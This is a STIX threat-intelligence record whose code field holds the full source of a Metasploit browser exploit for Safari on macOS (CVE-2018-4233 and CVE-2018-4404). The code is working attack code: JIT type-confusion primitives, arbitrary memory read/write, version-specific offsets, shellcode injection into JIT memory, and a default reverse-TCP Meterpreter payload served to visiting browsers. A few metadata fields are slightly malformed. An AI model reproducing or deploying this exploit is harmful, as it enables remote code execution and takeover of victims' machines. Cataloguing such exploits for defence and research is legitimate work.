{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c9eabdc1-e8cf-47a4-b2bd-bd4da100de0a",
    "created": "2024-08-14T16:34:19.930012Z",
    "modified": "2024-08-14T16:34:19.930016Z",
    "name": "Safari Proxy Object Type Confusion",
    "description": " This module exploits a type confusion bug in the Javascript Proxy object in WebKit. The DFG JIT does not take into account that, through the use of a Proxy it is possible to run arbitrary JS code during the execution of a CreateThis operation. This makes it possible to change the structure of e.g. an argument",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/browser/safari_proxy_object_type_confusion.rb",
            "external_id": "safari_proxy_object_type_confusion.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-4233"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-4404"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/saelo/cve-2018-4233"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/saelo/pwn2own2018"
        },
        {
            "source_name": "reference",
            "url": "https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf"
        },
        {
            "source_name": "stage1=exploit_data\"CVE-2018-4233\"",
            "external_id": "\"stage1.bin\""
        },
        {
            "source_name": "stage2=exploit_data\"CVE-2018-4404\"",
            "external_id": "\"stage2.dylib\""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Safari Proxy Object Type Confusion',\n      'Description'    => %q{\n          This module exploits a type confusion bug in the Javascript Proxy object in\n        WebKit. The DFG JIT does not take into account that, through the use of a Proxy,\n        it is possible to run arbitrary JS code during the execution of a CreateThis\n        operation. This makes it possible to change the structure of e.g. an argument\n        without causing a bailout, leading to a type confusion (CVE-2018-4233).\n\n          The JIT region is then replaced with shellcode which loads the second stage.\n        The second stage exploits a logic error in libxpc, which uses command execution\n        via the launchd's \"spawn_via_launchd\" API (CVE-2018-4404).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'saelo' ],\n      'References'     => [\n          ['CVE', '2018-4233'],\n          ['CVE', '2018-4404'],\n          ['URL', 'https://github.com/saelo/cve-2018-4233'],\n          ['URL', 'https://github.com/saelo/pwn2own2018'],\n          ['URL', 'https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf'],\n        ],\n      'Arch'           => [ ARCH_PYTHON, ARCH_CMD ],\n      'Platform'       => 'osx',\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => { 'PAYLOAD' => 'python/meterpreter/reverse_tcp' },\n      'Targets'        => [\n          [ 'Python payload',  { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],\n          [ 'Command payload', { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ],\n        ],\n      'DisclosureDate' => '2018-03-15'))\n    register_advanced_options([\n      OptBool.new('DEBUG_EXPLOIT', [false, \"Show debug information in the exploit javascript\", false]),\n    ])\n  end\n\n  def offset_table\n    {\n      '10.12.6' => {\n        jsc_vtab: '0x0000d8d8',\n        dyld_stub_loader: '0x00001168',\n        dlopen: '0x000027f7',\n        confstr: '0x00002c84',\n        strlen: '0x00001b40',\n        strlen_got: '0xdc0'\n      },\n      '10.13' => {\n        jsc_vtab: '0x0000e5f8',\n        dyld_stub_loader: '0x000012a8',\n        dlopen: '0x00002e60',\n        confstr: '0x000024fc',\n        strlen: '0x00001440',\n        strlen_got: '0xee8'\n      },\n      '10.13.1' => {\n        jsc_vtab: '0x0000e5f8',\n        dyld_stub_loader: '0x000012a8',\n        dlopen: '0x00002e60',\n        confstr: '0x000024dc',\n        strlen: '0x00001420',\n        strlen_got: '0xee8'\n      },\n      '10.13.2' => {\n        jsc_vtab: '0x0000e5e8',\n        dyld_stub_loader: '0x00001278',\n        dlopen: '0x00002e30',\n        confstr: '0x000024dc',\n        strlen: '0x00001420',\n        strlen_got: '0xee0'\n      },\n      '10.13.3' => {\n        jsc_vtab: '0xe5e8',\n        dyld_stub_loader: '0x1278',\n        dlopen: '0x2e30',\n        confstr: '0x24dc',\n        strlen: '0x1420',\n        strlen_got: '0xee0'\n      }\n    }\n  end\n\n  def stage1_js\n    stage1 = exploit_data \"CVE-2018-4233\", \"stage1.bin\"\n    \"var stage1 = new Uint8Array([#{Rex::Text::to_num(stage1)}]);\"\n  end\n\n  def stage2_js\n    stage2 = exploit_data \"CVE-2018-4404\", \"stage2.dylib\"\n    payload_cmd = payload.raw\n    if target['Arch'] == ARCH_PYTHON\n      payload_cmd = \"echo \\\"#{payload_cmd}\\\" | python\"\n    end\n    placeholder_index = stage2.index('PAYLOAD_CMD_PLACEHOLDER')\n    stage2[placeholder_index, payload_cmd.length] = payload_cmd\n    \"var stage2 = new Uint8Array([#{Rex::Text::to_num(stage2)}]);\"\n  end\n\n  def get_offsets(user_agent)\n    if user_agent =~ /Intel Mac OS X (.*?)\\)/\n      osx_version = $1.gsub(\"_\", \".\")\n      if user_agent =~ /Version\\/(.*?) /\n        if Rex::Version.new($1) >= Rex::Version.new('11.1.1')\n          print_warning \"Safari version #{$1} is not vulnerable\"\n          return false\n        else\n          print_good \"Safari version #{$1} appears to be vulnerable\"\n        end\n      end\n      mac_osx_version = Rex::Version.new(osx_version)\n      if mac_osx_version >= Rex::Version.new('10.13.4')\n        print_warning \"macOS version #{mac_osx_version} is not vulnerable\"\n      elsif mac_osx_version < Rex::Version.new('10.12')\n        print_warning \"macOS version #{mac_osx_version} is not vulnerable\"\n      elsif offset_table.key?(osx_version)\n        offset = offset_table[osx_version]\n        return <<-EOF\nconst JSC_VTAB_OFFSET = #{offset[:jsc_vtab]};\nconst DYLD_STUB_LOADER_OFFSET = #{offset[:dyld_stub_loader]};\nconst DLOPEN_OFFSET = #{offset[:dlopen]};\nconst CONFSTR_OFFSET = #{offset[:confstr]};\nconst STRLEN_OFFSET = #{offset[:strlen]};\nconst STRLEN_GOT_OFFSET = #{offset[:strlen_got]};\nEOF\n      else\n        print_warning \"No offsets for version #{mac_osx_version}\"\n      end\n    else\n      print_warning \"Unexpected User-Agent\"\n    end\n    return false\n  end\n\n  def on_request_uri(cli, request)\n    user_agent = request['User-Agent']\n    print_status(\"Request from #{user_agent}\")\n    offsets = get_offsets(user_agent)\n    unless offsets\n      send_not_found(cli)\n      return\n    end\n\n    utils = exploit_data \"javascript_utils\", \"utils.js\"\n    int64 = exploit_data \"javascript_utils\", \"int64.js\"\n    html = %Q^\n<html>\n<body>\n<script>\n#{stage1_js}\nstage1.replace = function(oldVal, newVal) {\n    for (var idx = 0; idx < this.length; idx++) {\n        var found = true;\n        for (var j = idx; j < idx + 8; j++) {\n            if (this[j] != oldVal.byteAt(j - idx)) {\n                found = false;\n                break;\n            }\n        }\n        if (found)\n            break;\n    }\n    this.set(newVal.bytes(), idx);\n};\n#{stage2_js}\n#{utils}\n#{int64}\n#{offsets}\n\nvar ready = new Promise(function(resolve) {\n    if (typeof(window) === 'undefined')\n        resolve();\n    else\n        window.onload = function() {\n            resolve();\n        }\n});\n\nready = Promise.all([ready]);\n\nprint = function(msg) {\n    //console.log(msg);\n    //document.body.innerText += msg + '\\\\n';\n}\n\n// Must create this indexing type transition first,\n// otherwise the JIT will deoptimize later.\nvar a = [13.37, 13.37];\na[0] = {};\n\nvar referenceFloat64Array = new Float64Array(0x1000);\n\n//\n// Bug: the DFG JIT does not take into account that, through the use of a\n// Proxy, it is possible to run arbitrary JS code during the execution of a\n// CreateThis operation. This makes it possible to change the structure of e.g.\n// an argument without causing a bailout, leading to a type confusion.\n//\n\n//\n// addrof primitive\n//\nfunction setupAddrof() {\n    function InfoLeaker(a) {\n        this.address = a[0];\n    }\n\n    var trigger = false;\n    var leakme = null;\n    var arg = null;\n\n    var handler = {\n        get(target, propname) {\n            if (trigger)\n                arg[0] = leakme;\n            return target[propname];\n        },\n    };\n    var InfoLeakerProxy = new Proxy(InfoLeaker, handler);\n\n    for (var i = 0; i < 100000; i++) {\n        new InfoLeakerProxy([1.1, 2.2, 3.3]);\n    }\n\n    trigger = true;\n\n    return function(obj) {\n        leakme = obj;\n        arg = [1.1, 1.1];\n        var o = new InfoLeakerProxy(arg);\n        return o.address;\n    };\n}\n\n//\n// fakeobj primitive\n//\nfunction setupFakeobj() {\n    function ObjFaker(a, address) {\n        a[0] = address;\n    }\n\n    var trigger = false;\n    var arg = null;\n\n    var handler = {\n        get(target, propname) {\n            if (trigger)\n                arg[0] = {};\n            return target[propname];\n        },\n    };\n    var ObjFakerProxy = new Proxy(ObjFaker, handler);\n\n    for (var i = 0; i < 100000; i++) {\n        new ObjFakerProxy([1.1, 2.2, 3.3], 13.37);\n    }\n\n    trigger = true;\n\n    return function(address) {\n        arg = [1.1, 1.1];\n        var o = new ObjFakerProxy(arg, address);\n        return arg[0];\n    };\n}\n\nfunction makeJITCompiledFunction() {\n    // Some code to avoid inlining...\n    function target(num) {\n        for (var i = 2; i < num; i++) {\n            if (num % i === 0) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    // Force JIT compilation.\n    for (var i = 0; i < 1000; i++) {\n        target(i);\n    }\n    for (var i = 0; i < 1000; i++) {\n        target(i);\n    }\n    for (var i = 0; i < 1000; i++) {\n        target(i);\n    }\n    return target;\n}\n\nfunction pwn() {\n    // Spray Float64Array structures so that structure ID 0x1000 will\n    // be a Float64Array with very high probability\n    var structs = [];\n    for (var i = 0; i < 0x1000; i++) {\n        var a = new Float64Array(1);\n        a['prop' + i] = 1337;\n        structs.push(a);\n    }\n\n    // Setup exploit primitives\n    var addrofOnce = setupAddrof();\n    var fakeobjOnce = setupFakeobj();\n\n    // (Optional) Spray stuff to keep the background GC busy and increase reliability even further\n    /*\n    var stuff = [];\n    for (var i = 0; i < 0x100000; i++) {\n        stuff.push({foo: i});\n    }\n    */\n\n    var float64MemView = new Float64Array(0x200);\n    var uint8MemView = new Uint8Array(0x1000);\n\n    // Setup container to host the fake Float64Array\n    var jsCellHeader = new Int64([\n        00, 0x10, 00, 00,     // m_structureID\n        0x0,                  // m_indexingType\n        0x2b,                 // m_type\n        0x08,                 // m_flags\n        0x1                   // m_cellState\n    ]);\n\n    var container = {\n        jsCellHeader: jsCellHeader.asJSValue(),\n        butterfly: null,\n        vector: float64MemView,\n        length: (new Int64('0x0001000000001337')).asJSValue(),\n        mode: {},       // an empty object, we'll need that later\n    };\n\n    // Leak address and inject fake object\n    // RawAddr == address in float64 form\n    var containerRawAddr = addrofOnce(container);\n    var fakeArrayAddr = Add(Int64.fromDouble(containerRawAddr), 16);\n    print(\"[+] Fake Float64Array @ \" + fakeArrayAddr);\n\n    ///\n    /// BEGIN CRITICAL SECTION\n    ///\n    /// Objects are corrupted, a GC would now crash the process.\n    /// We'll try to repair everything as quickly as possible and with a minimal amount of memory allocations.\n    ///\n    var driver = fakeobjOnce(fakeArrayAddr.asDouble());\n    while (!(driver instanceof Float64Array)) {\n        jsCellHeader.assignAdd(jsCellHeader, Int64.One);\n        container.jsCellHeader = jsCellHeader.asJSValue();\n    }\n\n    // Get some addresses that we'll need to repair our objects. We'll abuse the .mode\n    // property of the container to leak addresses.\n    driver[2] = containerRawAddr;\n    var emptyObjectRawAddr = float64MemView[6];\n    container.mode = referenceFloat64Array;\n    var referenceFloat64ArrayRawAddr = float64MemView[6];\n\n    // Fixup the JSCell header of the container to make it look like an empty object.\n    // By default, JSObjects have an inline capacity of 6, enough to hold the fake Float64Array.\n    driver[2] = emptyObjectRawAddr;\n    var header = float64MemView[0];\n    driver[2] = containerRawAddr;\n    float64MemView[0] = header;\n\n    // Copy the JSCell header from an existing Float64Array and set the butterfly to zero.\n    // Also set the mode: make it look like an OversizeTypedArray for easy GC survival\n    // (see JSGenericTypedArrayView<Adaptor>::visitChildren).\n    driver[2] = referenceFloat64ArrayRawAddr;\n    var header = float64MemView[0];\n    var length = float64MemView[3];\n    var mode = float64MemView[4];\n    driver[2] = containerRawAddr;\n    float64MemView[2] = header;\n    float64MemView[3] = 0;\n    float64MemView[5] = length;\n    float64MemView[6] = mode;\n\n    // Root the container object so it isn't garbage collected.\n    // This will allocate a butterfly for the fake object and store a reference to the container there.\n    // The fake array itself is rooted by the memory object (closures).\n    driver.container = container;\n\n    ///\n    /// END CRITICAL SECTION\n    ///\n    /// Objects are repaired, we will now survive a GC\n    ///\n    if (typeof(gc) !== 'undefined')\n        gc();\n\n    memory = {\n        read: function(addr, length) {\n            driver[2] = memory.addrof(uint8MemView).asDouble();\n            float64MemView[2] = addr.asDouble();\n            var a = new Array(length);\n            for (var i = 0; i < length; i++)\n                a[i] = uint8MemView[i];\n            return a;\n        },\n\n        write: function(addr, data) {\n            driver[2] = memory.addrof(uint8MemView).asDouble();\n            float64MemView[2] = addr.asDouble();\n            for (var i = 0; i < data.length; i++)\n                uint8MemView[i] = data[i];\n        },\n\n        read8: function(addr) {\n            driver[2] = addr.asDouble();\n            return Int64.fromDouble(float64MemView[0]);\n        },\n\n        write8: function(addr, value) {\n            driver[2] = addr.asDouble();\n            float64MemView[0] = value.asDouble();\n        },\n\n        addrof: function(obj) {\n            float64MemView.leakme = obj;\n            var butterfly = Int64.fromDouble(driver[1]);\n            return memory.read8(Sub(butterfly, 0x10));\n        },\n    };\n\n    print(\"[+] Got stable memory read/write!\");\n\n    // Find binary base\n    var funcAddr = memory.addrof(Math.sin);\n    var executableAddr = memory.read8(Add(funcAddr, 24));\n    var codeAddr = memory.read8(Add(executableAddr, 24));\n    var vtabAddr = memory.read8(codeAddr);\n    var jscBaseUnaligned = Sub(vtabAddr, JSC_VTAB_OFFSET);\n    print(\"[*] JavaScriptCore.dylib @ \" + jscBaseUnaligned);\n    var jscBase = And(jscBaseUnaligned, new Int64(\"0x7ffffffff000\"));\n    print(\"[*] JavaScriptCore.dylib @ \" + jscBase);\n\n    var dyldStubLoaderAddr = memory.read8(jscBase);\n    var dyldBase = Sub(dyldStubLoaderAddr, DYLD_STUB_LOADER_OFFSET);\n    var strlenAddr = memory.read8(Add(jscBase, STRLEN_GOT_OFFSET));\n    var libCBase = Sub(strlenAddr, STRLEN_OFFSET);\n    print(\"[*] dyld.dylib @ \" + dyldBase);\n    print(\"[*] libsystem_c.dylib @ \" + libCBase);\n\n    var confstrAddr = Add(libCBase, CONFSTR_OFFSET);\n    print(\"[*] confstr @ \" + confstrAddr);\n    var dlopenAddr = Add(dyldBase, DLOPEN_OFFSET);\n    print(\"[*] dlopen @ \" + dlopenAddr);\n\n    // Patching shellcode\n    var stage2Addr = memory.addrof(stage2);\n    stage2Addr = memory.read8(Add(stage2Addr, 16));\n    print(\"[*] Stage 2 payload @ \" + stage2Addr);\n\n    stage1.replace(new Int64(\"0x4141414141414141\"), confstrAddr);\n    stage1.replace(new Int64(\"0x4242424242424242\"), stage2Addr);\n    stage1.replace(new Int64(\"0x4343434343434343\"), new Int64(stage2.length));\n    stage1.replace(new Int64(\"0x4444444444444444\"), dlopenAddr);\n    print(\"[+] Shellcode patched\");\n\n    // Leak JITCode pointer poison value\n    var poison_addr = Add(jscBase, 305152);\n    print(\"[*] Poison value @ \" + poison_addr);\n    var poison = memory.read8(poison_addr);\n    print(\"[*] Poison value: \" + poison);\n\n    // Shellcode\n    var func = makeJITCompiledFunction();\n    var funcAddr = memory.addrof(func);\n    print(\"[+] Shellcode function object @ \" + funcAddr);\n    var executableAddr = memory.read8(Add(funcAddr, 24));\n    print(\"[+] Executable instance @ \" + executableAddr);\n    var jitCodeAddr = memory.read8(Add(executableAddr, 24));\n    print(\"[+] JITCode instance @ \" + jitCodeAddr);\n\n    var codeAddrPoisoned = memory.read8(Add(jitCodeAddr, 32));\n    var codeAddr = Xor(codeAddrPoisoned, poison);\n    print(\"[+] RWX memory @ \" + codeAddr.toString());\n    print(\"[+] Writing shellcode...\");\n    var origCode = memory.read(codeAddr, stage1.length);\n    memory.write(codeAddr, stage1);\n\n    print(\"[!] Jumping into shellcode...\");\n    var res = func();\n    if (res === 0) {\n        print(\"[+] Shellcode executed sucessfully!\");\n    } else {\n        print(\"[-] Shellcode failed to execute: error \" + res);\n    }\n\n    memory.write(codeAddr, origCode);\n    print(\"[*] Restored previous JIT code\");\n\n    print(\"[+] We are done here, continuing WebContent process as if nothing happened =)\");\n    if (typeof(gc) !== 'undefined')\n        gc();\n}\n\nready.then(function() {\n    try {\n        pwn();\n    } catch (e) {\n        print(\"[-] Exception caught: \" + e);\n    }\n}).catch(function(err) {\n    print(\"[-] Initializatin failed\");\n});\n\n</script>\n</body>\n</html>\n    ^\n    unless datastore['DEBUG_EXPLOIT']\n      html.gsub!(/^\\s*print\\s*\\(.*?\\);\\s*$/, '')\n    end\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\n\nend\n",
    "x_mitre_contributors": [
        "[ saelo ]",
        ""
    ],
    "x_mitre_disclosure_date": "2018-03-15",
    "x_mitre_platforms": [
        "osx'"
    ]
}